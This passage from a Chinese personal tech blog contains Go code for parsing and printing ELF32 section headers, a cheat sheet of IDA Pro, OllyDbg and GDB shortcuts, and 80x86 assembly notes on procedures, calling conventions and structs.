class="number">0x42</span>:<span class="string">"AI"</span>,</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="sh-addr"><a href="#sh-addr" class="headerlink" title="sh_addr"></a>sh_addr</h4><p>节区索引地址</p>
<h4 id="sh-offset"><a href="#sh-offset" class="headerlink" title="sh_offset"></a>sh_offset</h4><p>节区相对于文件的偏移地址</p>
<h4 id="sh-size"><a href="#sh-size" class="headerlink" title="sh_size"></a>sh_size</h4><p>节区的大小</p>
<h4 id="sh-link"><a href="#sh-link" class="headerlink" title="sh_link"></a>sh_link</h4><p>此成员给出节区头部表索引链接</p>
<h4 id="sh-info"><a href="#sh-info" class="headerlink" title="sh_info"></a>sh_info</h4><p>此成员给出附加信息</p>
<h4 id="sh-addralign"><a href="#sh-addralign" class="headerlink" title="sh_addralign"></a>sh_addralign</h4><p>某些节区带有地址对齐约束</p>
<h4 id="sh-entsize"><a href="#sh-entsize" class="headerlink" title="sh_entsize"></a>sh_entsize</h4><p>某些节区中包含固定大小的项目,如符号表</p>
<h3 id="读取Section-Header-Table"><a href="#读取Section-Header-Table" class="headerlink" title="读取Section Header Table"></a>读取Section Header Table</h3><p>这里有一个关键点，就是sh_name不是直接的保存的字符数据，而是相对于节区名称表(.shstrtab)的起始地址偏差，所以说得先提取出节区名称表(.shstrtab)的数据才能得到每个节区的名称，来源就是直接ELF Header里的e_shstrndx成员</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Shdr Elf32_Shdr)</span> <span class="title">Findshstrtab</span><span class="params">(Ehdr Elf32_Ehdr,data []<span class="keyword">byte</span>)</span>[]<span class="title">byte</span></span>&#123;</span><br><span class="line">	<span class="comment">//var num int64 = int64(Ehdr.e_shnum)//获取到名称表总数</span></span><br><span class="line">	<span class="comment">//先找到.shstrtab段的数据拿到节区名称表</span></span><br><span class="line">	<span class="keyword">var</span> strtab = <span class="keyword">int64</span>(Ehdr.e_shstrndx)</span><br><span class="line">	shsize := <span class="keyword">int64</span>(Ehdr.e_shentsize)</span><br><span class="line">	<span class="keyword">var</span> t_Index <span class="keyword">int64</span>= <span class="keyword">int64</span>(Ehdr.e_shoff)</span><br><span class="line">	TabStIndex := t_Index + strtab*shsize</span><br><span class="line">	t_data := data[<span class="keyword">int</span>(TabStIndex):<span class="keyword">int</span>(TabStIndex+shsize)]</span><br><span class="line">	<span class="comment">//fmt.Println(t_data)</span></span><br><span class="line">	<span class="comment">//获取节区大小</span></span><br><span class="line">	t_size := t_data[<span class="number">20</span>:<span class="number">24</span>]</span><br><span class="line">	t_size = Change.LSBtoMSB(t_size)</span><br><span class="line">	size := Change.BytesToInt32(t_size)</span><br><span class="line">	<span class="comment">//fmt.Println(int64(size))</span></span><br><span class="line">	<span class="comment">//获取数据偏移地址</span></span><br><span class="line">	t_offset := t_data[<span class="number">16</span>:<span class="number">20</span>]</span><br><span class="line">	t_offset = Change.LSBtoMSB(t_offset)</span><br><span class="line">	offset := Change.BytesToInt32(t_offset)</span><br><span class="line">	<span class="comment">//fmt.Println(Change.DecHex(int64(offset)))</span></span><br><span class="line">	t_data = data[<span class="keyword">int</span>(offset):<span class="keyword">int</span>(offset+size)]</span><br><span class="line">	<span class="keyword">return</span> t_data</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Shdr Elf32_Shdr)</span> <span class="title">FindName</span><span class="params">(index <span class="keyword">int32</span>,data []<span class="keyword">byte</span>)</span><span class="title">string</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> t_str <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">for</span>&#123;</span><br><span class="line">		t_str += <span class="keyword">string</span>(data[index])</span><br><span class="line">		index++</span><br><span class="line">		<span class="keyword">if</span>(data[index] == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> t_str</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解决之后只要接下来按部就班读取就好了</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Shdr Elf32_Shdr)</span> <span class="title">Mainread</span><span class="params">(Ehdr Elf32_Ehdr,data []<span class="keyword">byte</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> Shnum <span class="keyword">int64</span> = <span class="keyword">int64</span>(Ehdr.e_shnum) <span class="comment">//获取Section Header Table数量</span></span><br><span class="line">	<span class="keyword">var</span> StartIndex <span class="keyword">int64</span>= <span class="keyword">int64</span>(Ehdr.e_shoff)</span><br><span class="line">	<span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="keyword">int</span>(Shnum);i++ &#123;</span><br><span class="line">		Shdr.SonRead(i,StartIndex,data,<span class="keyword">int64</span>(Ehdr.e_shentsize),Ehdr)</span><br><span class="line">		fmt.Println()</span><br><span class="line">		StartIndex = StartIndex + <span class="keyword">int64</span>(Ehdr.e_shentsize)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">"Key to Flags:"</span>)</span><br><span class="line">	fmt.Println(<span class="string">"  W (write), A (alloc), X (execute), M (merge), S (strings)"</span>)</span><br><span class="line">	fmt.Println(<span class="string">"  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)"</span>)</span><br><span class="line">	fmt.Println(<span class="string">"  O (extra OS processing required) o (OS specific), p (processor specific)"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Shdr Elf32_Shdr)</span> <span class="title">SonRead</span><span class="params">(i <span class="keyword">int</span>,StartIndex <span class="keyword">int64</span>,data []<span class="keyword">byte</span>,size <span class="keyword">int64</span>,Ehdr Elf32_Ehdr)</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> t_data []<span class="keyword">byte</span> = data[StartIndex:StartIndex+size]</span><br><span class="line">	<span class="keyword">var</span> t_shdr Elf32_Shdr</span><br><span class="line">	<span class="comment">//sh_name Elf32_Word</span></span><br><span class="line">	tmp := t_data[:<span class="number">4</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	t_shdr.sh_name = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//sh_type Elf32_Word</span></span><br><span class="line">	tmp = t_data[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	t_shdr.sh_type = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//sh_flags Elf32_Word</span></span><br><span class="line">	tmp = t_data[<span class="number">8</span>:<span class="number">12</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	t_shdr.sh_flags = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//sh_addr Elf32_Addr</span></span><br><span class="line">	tmp = t_data[<span class="number">12</span>:<span class="number">16</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	t_shdr.sh_addr = Elf32_Addr(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//sh_offset Elf32_Off</span></span><br><span class="line">	tmp = t_data[<span class="number">16</span>:<span class="number">20</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	t_shdr.sh_offset = Elf32_Off(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//sh_size Elf32_Word</span></span><br><span class="line">	tmp = t_data[<span class="number">20</span>:<span class="number">24</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	t_shdr.sh_size = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//sh_link Elf32_Word</span></span><br><span class="line">	tmp = t_data[<span class="number">24</span>:<span class="number">28</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	t_shdr.sh_link = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//sh_info Elf32_Word</span></span><br><span class="line">	tmp = t_data[<span class="number">28</span>:<span class="number">32</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	t_shdr.sh_info = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//sh_addralign Elf32_Word</span></span><br><span class="line">	tmp = t_data[<span class="number">32</span>:<span class="number">36</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	t_shdr.sh_addralign = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//sh_entsize Elf32_Word</span></span><br><span class="line">	tmp = t_data[<span class="number">36</span>:<span class="number">40</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	t_shdr.sh_entsize = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//fmt.Println(t_shdr)</span></span><br><span class="line">	<span class="comment">//[Nr]</span></span><br><span class="line">	fmt.Print(<span class="string">"["</span>)</span><br><span class="line">	fmt.Printf(<span class="string">"%2v"</span>,i)</span><br><span class="line">	fmt.Print(<span class="string">"] "</span>)</span><br><span class="line">	<span class="comment">//Name</span></span><br><span class="line">	<span class="keyword">if</span> t_shdr.sh_name == <span class="number">0</span>&#123;</span><br><span class="line">		t_Str := <span class="string">"0"</span></span><br><span class="line">		fmt.Printf(<span class="string">"%-18s"</span>,t_Str)</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		ShName := Shdr.Findshstrtab(Ehdr,data)</span><br><span class="line">		t_Str := Shdr.FindName(<span class="keyword">int32</span>(t_shdr.sh_name),ShName)</span><br><span class="line">		fmt.Printf(<span class="string">"%-18s"</span>,t_Str)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Type</span></span><br><span class="line">	tmpstr := ShType[<span class="keyword">int</span>(<span class="keyword">int32</span>(t_shdr.sh_type))]</span><br><span class="line">	<span class="keyword">if</span> tmpstr ==<span class="string">""</span>&#123;</span><br><span class="line">		fmt.Printf(<span class="string">"%-16s"</span>,<span class="string">"Unknown"</span>)</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		fmt.Printf(<span class="string">"%-16s"</span>,tmpstr)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Addr</span></span><br><span class="line">	tmpstr = Change.DecHex(<span class="keyword">int64</span>(t_shdr.sh_addr))</span><br><span class="line">	fmt.Printf(<span class="string">"%-9s"</span>,tmpstr)</span><br><span class="line">	<span class="comment">//Off</span></span><br><span class="line">	tmpstr = Change.DecHex(<span class="keyword">int64</span>(t_shdr.sh_offset))</span><br><span class="line">	fmt.Printf(<span class="string">"%-7s"</span>,tmpstr)</span><br><span class="line">	<span class="comment">//Size</span></span><br><span class="line">	tmpstr = Change.DecHex(<span class="keyword">int64</span>(t_shdr.sh_size))</span><br><span class="line">	fmt.Printf(<span class="string">"%-7s"</span>,tmpstr)</span><br><span class="line">	<span class="comment">//ES</span></span><br><span class="line">	tmpstr = Change.DecHex(<span class="keyword">int64</span>(t_shdr.sh_entsize))</span><br><span class="line">	fmt.Printf(<span class="string">"%-3s"</span>,tmpstr)</span><br><span class="line">	<span class="comment">//Flg</span></span><br><span class="line">	tmpstr = ShFlag[<span class="keyword">int</span>(<span class="keyword">int32</span>(t_shdr.sh_flags))]</span><br><span class="line">	fmt.Printf(<span class="string">"%3s"</span>,tmpstr)</span><br><span class="line">	<span class="comment">//Lk</span></span><br><span class="line">	tmpstr = Change.DecHex(<span class="keyword">int64</span>(t_shdr.sh_link))</span><br><span class="line">	fmt.Printf(<span class="string">"%3s"</span>,tmpstr)</span><br><span class="line">	<span class="comment">//Inf</span></span><br><span class="line">	tmpstr = Change.DecHex(<span class="keyword">int64</span>(t_shdr.sh_info))</span><br><span class="line">	fmt.Print(<span class="string">" "</span>)</span><br><span class="line">	fmt.Printf(<span class="string">"%3s"</span>,tmpstr)</span><br><span class="line">	<span class="comment">//Al</span></span><br><span class="line">	tmpstr = Change.DecHex(<span class="keyword">int64</span>(t_shdr.sh_addralign))</span><br><span class="line">	fmt.Print(<span class="string">" "</span>)</span><br><span class="line">	fmt.Printf(<span class="string">"%2s"</span>,tmpstr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>负责打印一开始的部分</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Shdr Elf32_Shdr)</span> <span class="title">PHeader</span><span class="params">(Ehdr Elf32_Ehdr)</span></span>&#123;</span><br><span class="line">	fmt.Println(<span class="string">"There are"</span>,Ehdr.e_shnum,</span><br><span class="line">		<span class="string">"section headers, starting at offset"</span>,</span><br><span class="line">		<span class="string">"0x"</span>+</span><br><span class="line">		Change.DecHex(<span class="keyword">int64</span>(Ehdr.e_shoff))+<span class="string">":"</span>,</span><br><span class="line">		)</span><br><span class="line">	fmt.Println()</span><br><span class="line">	fmt.Println(<span class="string">"Section Headers:"</span>)</span><br><span class="line">	fmt.Println(<span class="string">"[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/17/IDAíóGDBíóDBG│ú╙├▓┘╫≈/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/03/17/IDAíóGDBíóDBG│ú╙├▓┘╫≈/" class="post-title-link" itemprop="url">IDA、GDB、DBG常用操作</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-03-17 08:21:18 / Geändert am: 23:22:02" itemprop="dateCreated datePublished" datetime="2020-03-17T08:21:18-07:00">2020-03-17</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="IDA-Pro"><a href="#IDA-Pro" class="headerlink" title="IDA Pro"></a>IDA Pro</h2><ul>
<li>F5：反编译代码</li>
<li>Space：切换汇编代码展示方式（流程图or顺序）</li>
<li>tab：切换反编译窗口和汇编窗口</li>
<li>n：自定义变量函数名</li>
<li>y：自定义函数参数、调用方式</li>
<li>/：添加注释</li>
<li>x：交叉引用</li>
<li>shift + E：导出数据</li>
</ul>
<h2 id="Olly-DBG"><a href="#Olly-DBG" class="headerlink" title="Olly DBG"></a>Olly DBG</h2><ul>
<li>F7：步进，跟进函数调用</li>
<li>F8：步过，不跟进函数调用</li>
<li>F9：运行直到断点</li>
<li>F4：执行到光标</li>
<li>F2：下断点</li>
<li>ctrl+g：跳转到指定地址</li>
</ul>
<h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><ul>
<li>控制流操作<ul>
<li>r：运行程序</li>
<li>r&lt;a.txt：重定向输入</li>
<li>si：步进</li>
<li>ni：步过</li>
<li>c：继续运行直到断点</li>
<li>finish：运行到函数结束</li>
</ul>
</li>
<li>断点<ul>
<li>b *0xaabb：在指定位置下断点</li>
<li>b main：在指定函数下断点</li>
<li>watch *0xaabb：当修改内存时中断</li>
<li>rwatch *0xaabb：在读取内存时中断</li>
<li>info b：查看当前断电</li>
<li>en 1：打开1号断点</li>
<li>dis 1：关闭1号断点</li>
</ul>
</li>
<li>查看内存<ul>
<li>x命令查看内存<ul>
<li>x/16xb 0xaabb<ul>
<li>查看0xaabb位置的内存，显示为16进制，单位为1字节</li>
<li>16代表往后数16份单位内存，x代表十进制，b代表byte</li>
</ul>
</li>
<li>x/32dw 0xaabb<ul>
<li>查看0xaabb位置的内存，显示为10进制整数，单位为2字节</li>
<li>d代表十进制整数，word代表1个字两个字节</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><ul>
<li>Android\JAVA<ul>
<li>JEB</li>
<li>jadx</li>
<li>xposed\Frida</li>
</ul>
</li>
<li>MIPS<ul>
<li>JEB</li>
<li>Ghidra</li>
</ul>
</li>
</ul>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/80x86╗π▒α▒╩╝╟04/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/03/03/80x86╗π▒α▒╩╝╟04/" class="post-title-link" itemprop="url">80x86汇编笔记04</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-03-03 17:58:29" itemprop="dateCreated datePublished" datetime="2020-03-03T17:58:29-08:00">2020-03-03</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Bearbeitet am</span>
                <time title="Geändert am: 2020-03-04 09:58:46" itemprop="dateModified" datetime="2020-03-04T09:58:46-08:00">2020-03-04</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="子程序"><a href="#子程序" class="headerlink" title="子程序"></a>子程序</h2><h3 id="子程序的定义"><a href="#子程序的定义" class="headerlink" title="子程序的定义"></a>子程序的定义</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">子程序名 proc [距离][语言类型][可视区域][USES寄存器列表][参数：类型]...[VARARG]</span><br><span class="line">	local	局部变量列表</span><br><span class="line">	指令</span><br><span class="line">子程序名 endp</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[]是可选项</p>
</blockquote>
<ul>
<li><p>距离：可以是NEAR、FAR、NEAR16、NEAR32、FAR16或FAR32，Win32中只有一个平坦的段，无所谓距离，所以对距离的定义往往忽略</p>
</li>
<li><p>语言类型：表示参数的使用方式和堆栈平衡的方式，可以是StdCall、C、SysCall、BASIC、FORTRAN和PASCAL，如果忽略，则使用程序头部.model定义的值</p>
</li>
<li><p>可视区域：可以是PRIVATE、PUBLIC和EXPORT。默认的设置是PUBLIC</p>
<ul>
<li>PRIVATE：表示子程序只对本模块可见</li>
<li>PUBLIC：表示对所有的模块可见（在最后编译链接完成的exe文件中）</li>
<li>EXPORT：表示是导出的函数，当编写DLL的时候要将某个函数导出的时候可以这样用</li>
</ul>
</li>
<li><p>USES寄存器列表：表示由编译器在子程序指令开始前自动安排push这些寄存器的指令，并在ret前自动安排pop指令，用于保存执行环境</p>
</li>
<li><p>参数和类型：参数指定参数的名称，在定义参数名的时候不能跟全局变量和子程序中的局部变量重名。对于类型由于Win32中的参数类型只有32位一种类型，可以省略。在参数定义的最后还可以跟多个数量不确定的参数，在Win32汇编中唯一使用VARARG的API就是wsprintf</p>
</li>
</ul>
<p>完成了定义之后，可以用invoke伪指令调用，为了让invoke指令能正常使用，必须在程序的头部用proto伪操作定义子程序的信息</p>
<p>如果先写子程序，再写主程序，就不需要invoke</p>
<h2 id="参数传递和堆栈平衡"><a href="#参数传递和堆栈平衡" class="headerlink" title="参数传递和堆栈平衡"></a>参数传递和堆栈平衡</h2><p>在调用子程序时，参数的传递是通过堆栈进行的，也就说，调用者要传递给子程序的参数压入堆栈，子程序在堆栈中取出相应的值再使用</p>
<p>比如要调用：<code>SubRouting(Var1,Var2,Var3)</code>经过编译后的最终代码会是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push Var3</span><br><span class="line">push Var2</span><br><span class="line">push Var1</span><br><span class="line">call SubRouting</span><br><span class="line">add esp,12</span><br></pre></td></tr></table></figure>

<p>不同的调用规范</p>
<table>
<thead>
<tr>
<th align="center">语言</th>
<th align="center">最先入栈参数</th>
<th align="center">清除堆栈者</th>
<th align="center">允许使用VARARG</th>
</tr>
</thead>
<tbody><tr>
<td align="center">C</td>
<td align="center">右</td>
<td align="center">调用者</td>
<td align="center">是</td>
</tr>
<tr>
<td align="center">SysCall</td>
<td align="center">右</td>
<td align="center">子程序</td>
<td align="center">是</td>
</tr>
<tr>
<td align="center">StdCall</td>
<td align="center">右</td>
<td align="center">子程序</td>
<td align="center">是</td>
</tr>
<tr>
<td align="center">BASIC</td>
<td align="center">左</td>
<td align="center">子程序</td>
<td align="center">否</td>
</tr>
<tr>
<td align="center">FORTRAN</td>
<td align="center">左</td>
<td align="center">子程序</td>
<td align="center">否</td>
</tr>
<tr>
<td align="center">PASCAL</td>
<td align="center">左</td>
<td align="center">子程序</td>
<td align="center">否</td>
</tr>
</tbody></table>
<blockquote>
<p>特殊的是StdCall的对战清楚平时是由子程序完成的，但使用VARARG时是由调用者清除的</p>
</blockquote>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>数据结构实际上是由多个字段组成的数据样板，相当于一种自定义的数据类型，数据结构中间的每一个字段可以是字节、字、双字、字符串或所有可能的数据类型</p>
<p>比如在API函数RegisterClass中要使用到一个叫做WNDCLASS的数据结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typeof struct_WNDCLASS&#123;</span><br><span class="line">    UINT	style;</span><br><span class="line">    WNDPROC	lpfnWndProc;</span><br><span class="line">    Int		cbClsExtra;</span><br><span class="line">    Int		cbWndExtra;</span><br><span class="line">    HINSTANCE	hInstance;</span><br><span class="line">    HICON	hIcon;</span><br><span class="line">    HCURSOR	hCursor;</span><br><span class="line">    HBRUSH	hbrBackground;</span><br><span class="line">    LPCTSTR	lpszMenuName;</span><br><span class="line">    LPCTSTR	lpszClassName;</span><br><span class="line">&#125;WNDCLASS.*PWNDCLASS</span><br></pre></td></tr></table></figure>

<p>这是C语言格式的，在汇编中是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WNDCLASS struct</span><br><span class="line">	Style	DWORD	?</span><br><span class="line">	lpfnWndProc	DWORD	?</span><br><span class="line">    cbClsExtra	DWORD	?</span><br><span class="line">    cbWndExtra	DWORD	?</span><br><span class="line">    hInstance	DWORD	?</span><br><span class="line">    hIcon	DWORD	?</span><br><span class="line">    hCursor	DWORD	?</span><br><span class="line">    hbrBackground	DWORD	?</span><br><span class="line">    lpszMenuName	DWORD	?</span><br><span class="line">    lpszClassName	DWORD	?</span><br><span class="line">WNDCLASS	ends</span><br></pre></td></tr></table></figure>

<p>和大部分的常量一样，几乎所有API所涉及的数据结构在Windows.inc文件中都已经定义了</p>
<p>定义了数据结构实际上只是定义了一个样板，上面的定义语句并不会在哪个段中产生数据。只是以一个模板的形式存在，今后通过这个样板声明定义结构变量才占用空间</p>
<p>使用数据结构在数据段中定义数据的方法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data?</span><br><span class="line">stWndClass	WNDCLASS	&lt;&gt;</span><br><span class="line">...</span><br><span class="line">.data</span><br><span class="line">stWndClass	WNDCLASS	&lt;1,1,1,1,1,1,1,1,1,1&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>第一段的定义方法是未初始化的定义方法</li>
<li>第二段是在定义的同时指定结构中各字段的初始化值，各字段的初始值用逗号隔开</li>
</ul>
<h2 id="数据结构的引用"><a href="#数据结构的引用" class="headerlink" title="数据结构的引用"></a>数据结构的引用</h2><p>在汇编中数据结构的引用方法有好几种，以上面的定义为例，如果要使用stWndClass中的lpfnWndProc字段，最直接的办法是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov	eax,stWndClass.lpfnWndProc</span><br></pre></td></tr></table></figure>

<p>在实际使用中，常常有使用指令存取数据结构的情况，如果使用esi寄存器做指针寻址，可以使用下列语句：</p>
